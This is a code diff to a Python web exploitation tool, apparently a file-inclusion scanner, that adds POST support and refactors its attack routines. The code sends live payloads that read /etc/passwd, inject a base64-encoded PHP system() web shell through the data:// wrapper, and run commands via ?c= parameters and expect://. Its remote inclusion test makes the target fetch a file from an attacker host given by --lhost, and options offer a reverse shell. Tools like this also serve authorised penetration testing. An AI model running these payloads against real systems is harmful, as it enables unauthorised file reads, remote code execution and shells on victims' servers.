@@ -83,7 +83,7 @@ def addHeader(newKey, newVal):
 def delHeader(key):
     headers.pop(key)
 
-def getExploit(req, request_type, exploit_type, getVal, postVal, headers, attackType, os):
+def addToExploits(req, request_type, exploit_type, getVal, postVal, headers, attackType, os):
     global exploits
     e = {}
     e['REQUEST_TYPE'] = request_type
@@ -106,10 +106,13 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType):
                   "file%3A%2F%2F%2Fetc%2Fpasswd", "cat%20/etc/passwd", "cat%20/etc/group",
                   "///etc/passwd", "/etc/passwd", "file%3A%2F%2F%2Fetc%2Fgroup%2500", 
                   "file%3A%2F%2F%2Fetc%2Fgroup", "file://etc/group%00", "file:///etc/group", 
-                  "/etc/group","https://www.google.com/", "rfitest.txt", "ipconfig",
-                  scriptName, scriptName+".php", scriptName+"%00"]
-    
+                  "/etc/group","https://www.google.com/", "rfitest.txt", "ipconfig"]
 
+    if(scriptName != ""):
+        TO_REPLACE.append(scriptName)
+        TO_REPLACE.append(scriptName+".php")
+        TO_REPLACE.append(scriptName+"%00")
+    
     if(checkPayload(req)):
         for i in range(len(TO_REPLACE)):
             if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
@@ -120,7 +123,7 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType):
                     os = "WINDOWS"
                 else: os = "LINUX"
                 
-                exploit = getExploit(req, reqType, explType, u, postVal, headers, attackType, os)
+                exploit = addToExploits(req, reqType, explType, u, postVal, headers, attackType, os)
                     
                 #Print finding
                 if(postVal == ""):
@@ -162,8 +165,6 @@ def test_file_trunc(url):
             if(init(res, 'GET', 'LFI', u, '', headers, 'FILE')):
                 break
     else: 
-        addHeader("Content-Type", "application/x-www-form-urlencoded")
-        
         for i in range(len(tests)):
             postTest = args.postreq.replace(args.param, tests[i])
             res = requests.post(url, data=postTest, headers = headers, proxies = proxies)
@@ -171,7 +172,6 @@ def test_file_trunc(url):
             if(init(res, 'POST', 'LFI', url, postTest, headers, 'FILE')):
                 break
         
-        delHeader("Content-Type")
 
 def test_trunc(url):
     if(args.verbose):
@@ -188,7 +188,6 @@ def test_trunc(url):
                 if(init(res, 'GET', 'LFI', u, '', headers, 'TRUNC')):
                     break
     else:
-        addHeader("Content-Type", "application/x-www-form-urlencoded")
         with open(truncWordlist, "r") as f:
             for line in f:
                 line = line[:-1]
@@ -199,7 +198,6 @@ def test_trunc(url):
                 if(init(res, 'POST', 'LFI', url, postTest, headers, 'TRUNC')):
                     break
         
-        delHeader("Content-Type")
     
     return
 
@@ -217,7 +215,6 @@ def test_cmd_injection(url):
                 if(init(res, 'GET', 'RCE', url, '', headers, 'CMDINJECT')):
                     break
     else:
-        addHeader("Content-Type", "application/x-www-form-urlencoded")
         with open(cmdWordlist) as f:
             for line in f:
                 line = line[:-1]
@@ -298,14 +295,12 @@ def test_filter(url):
                 #TODO
                 pass
     else:
-        addHeader("Content-Type", "application/x-www-form-urlencoded")
         for i in range(len(tests)):
             postTest = args.postreq.replace(args.param, tests[i])
             res = requests.post(url, data=postTest, headers = headers, proxies = proxies)
             
             if(init(res, 'POST', 'LFI', url, postTest, headers, 'FILTER')):
                 break
-        delHeader("Content-Type")
 
     return
 
@@ -335,20 +330,14 @@ def test_data(url):
         urls.append("?c=ipconfig")
         urls.append("?c=type%20C:/Windows/System32/drivers/etc/hosts")
 
-        addHeader("Content-Type", "application/x-www-form-urlencoded")    
-        
-        tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K")
-        tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K")
-        tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K")
-        tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K")
-        
-        for i in range(len(tests)):
-            postTest = args.postreq.replace(args.param, tests[i])
-            res = requests.post(url+urls[i], postTest, headers = headers, proxies = proxies)
+        test = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"
 
-            if(init(res, 'POST', 'RCE', url, postTest, headers, 'DATA')):
+        for i in range(len(urls)):
+            postTest = args.postreq.replace(args.param, test)
+            res = requests.post(url + urls[i], postTest, headers = headers, proxies = proxies)
+
+            if(init(res, 'POST', 'RCE', url + urls[i], postTest, headers, 'DATA')):
                 break
-        delHeader("Content-Type")
     return
 
 def test_input(url):
@@ -378,7 +367,6 @@ def test_input(url):
                 if(init(res, 'POST', 'RCE', u, posts[j], headers, 'INPUT')):
                     return
     else:
-        addHeader("Content-Type", "application/x-www-form-urlencoded")
         for i in range(len(tests)):
             postTest = args.postreq.replace(args.param, tests[i])
 
@@ -386,7 +374,6 @@ def test_input(url):
                 res = requests.post(url, data=postTest, headers = headers, proxies = proxies)
                 if(init(res, 'POST', 'RCE', url, posts[j], headers, 'INPUT')):
                     return
-        delHeader("Content-Type")    
     return
 
 
@@ -412,13 +399,11 @@ def test_expect(url):
             if(init(res, 'GET', 'RCE', u, '', headers, 'EXPECT')):
                 return
     else:
-        addHeader("Content-Type", "application/x-www-form-urlencoded")
         for i in range(len(tests)):
             postTest = args.postreq.replace(args.param, tests[i])
             res = requests.post(url, data = postTest, headers = headers, proxies = proxies)
             if(init(res, 'POST', 'RCE', url, postTest, headers, 'EXPECT')):
                 break
-        delHeader("Content-Type")
     return
 
 def test_rfi(url):
@@ -429,24 +414,33 @@ def test_rfi(url):
     if(args.lhost):
         try:
             threading.Thread(target=serve_forever).start()
-            
-            u = url.replace(args.param, "http://{0}:{1}/rfitest.txt".format(args.lhost, str(rfi_test_port)))
-            res = requests.get(u, headers = headers, proxies = proxies, timeout = 1)
-            if(init(res, 'GET', 'RFI', u, '', headers, 'RFI')):
-                return
+            test = "http://{0}:{1}/rfitest.txt".format(args.lhost, str(rfi_test_port))
+            u = url.replace(args.param, test)
+
+            if(not args.postreq):
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if(init(res, 'GET', 'RFI', u, '', headers, 'RFI')): return
+            else:
+                postTest = args.postreq.replace(args.param, test)
+                res = requests.post(url, headers = headers, data = postTest, proxies = proxies)
+                if(init(res, 'POST', 'RFI', url, postTest, headers, 'RFI')): return
         except:
             #lfimap_cleanup()
             pass
 
     #Internet RFI test
     pyld = "https://www.google.com/"
-    u = url.replace(args.param, pyld)
     try:
-        res = requests.get(u, headers = headers, proxies = proxies, timeout = 1)
-        if(init(res, 'GET', 'RFI', u, '', headers, 'OTHER')):
-            return
+        if(not args.postreq):
+            u = url.replace(args.param, pyld)
+            res = requests.get(u, headers = headers, proxies = proxies)
+            if(init(res, 'GET', 'RFI', u, '', headers, 'RFI')): return
+        else:
+            postTest = args.postreq.replace(args.param, pyld)
+            res = requests.post(url, data = postTest, headers = headers, proxies = proxies)
+            if(init(res, 'POST', 'RFI', url, postTest, headers, 'RFI')): return
     except:
-        #lfimap_cleanup()
+        #TODO
         pass
 
 def test_errors(url):
@@ -454,7 +448,7 @@ def test_errors(url):
         print("Testing for error info disclosure...")
 
     tests = []
-    tests.append("/?!%$đžšč%!?/")
+    tests.append("/?!%$$%!?/")
     
     errors = ["Warning", "include("]
 
@@ -465,7 +459,6 @@ def test_errors(url):
             if(errors[0] in res.text and errors[1] in res.text):
                 print("[+] Possible LFI -> include() error triggered -> " + u)
     else:
-        addHeader("Content-Type", "application/x-www-form-urlencoded")
         for test in tests:
             postTest = args.postreq.replace(args.param, test)
             req = requests.post(url, headers = headers, data = postTest, proxies = proxies)
@@ -473,7 +466,6 @@ def test_errors(url):
             if(errors[0] in req.text and errors[1] in req.text):
                 print("[+] Possible LFI -> include() error triggered -> " + url + " -> HTTP POST -> " + postTest)
 
-        delHeader("Content-Type")
         return
 
 
@@ -915,16 +907,16 @@ if(__name__ == "__main__"):
     attackGroup.add_argument('-e', '--expect', action = "store_true", dest = 'php_expect', help="\t\t Attack using expect:// wrapper")
     attackGroup.add_argument('-t', '--trunc', action = "store_true", dest = "trunc", help="\t\t Attack using path truncation with wordlist (default 'short.txt')")
     attackGroup.add_argument('-r', '--rfi', action = "store_true", dest = 'rfi', help="\t\t Attack using remote file inclusion")
+    attackGroup.add_argument('-c', '--cmd', action = "store_true", dest = "cmd", help="\t\t Attack using command injection")
     attackGroup.add_argument('--file', action = "store_true", dest="file", help="\t\t Attack using file:// wrapper")
-    attackGroup.add_argument('--osinject', action = "store_true", dest = "cmd", help="\t\t Attack using os command injection")
     attackGroup.add_argument('--xss', action = "store_true", dest = "xss", help="\t\t Cross site scripting test")
     attackGroup.add_argument('-a', '--all', action = "store_true", dest = 'test_all', help="\t\t Use all available methods to attack")
     
     
     payloadGroup = parser.add_argument_group('PAYLOAD OPTIONS')
-    payloadGroup.add_argument('-x', '--shell',action="store_true", dest="revshell", help="\t\t Send reverse shell if possible (Setup reverse handler first)")
-    payloadGroup.add_argument('--lhost', type=str, metavar="<lhost>", dest="lhost", help="\t\t Specify localhost IP address for reverse connection")
-    payloadGroup.add_argument('--lport', type=int, metavar="<lport>", dest="lport", help="\t\t Specify local PORT number for reverse connection")
+    payloadGroup.add_argument('-x', '--exploit',action="store_true", dest="revshell", help="\t\t Exploit to reverse shell if possible (Setup reverse listener first)")
+    payloadGroup.add_argument('--lhost', type=str, metavar="<lhost>", dest="lhost", help="\t\t Specify local ip address for reverse connection")
+    payloadGroup.add_argument('--lport', type=int, metavar="<lport>", dest="lport", help="\t\t Specify local port number for reverse connection")
     
     wordlistGroup = parser.add_argument_group('WORDLIST OPTIONS')
     wordlistGroup.add_argument('-wT', type=str, metavar = "<path>", dest="truncWordlist", help="\t\t Specify wordlist for truncation test")
@@ -1044,6 +1036,8 @@ if(__name__ == "__main__"):
     headers = prepareHeaders()
     if(args.cookie is not None):
         addHeader('Cookie', args.cookie)
+    if(args.postreq):
+        addHeader("Content-Type", "application/x-www-form-urlencoded")
     if(args.httpheaders):
         for i in range(len(args.httpheaders)):
             if(":" not in args.httpheaders[i]):
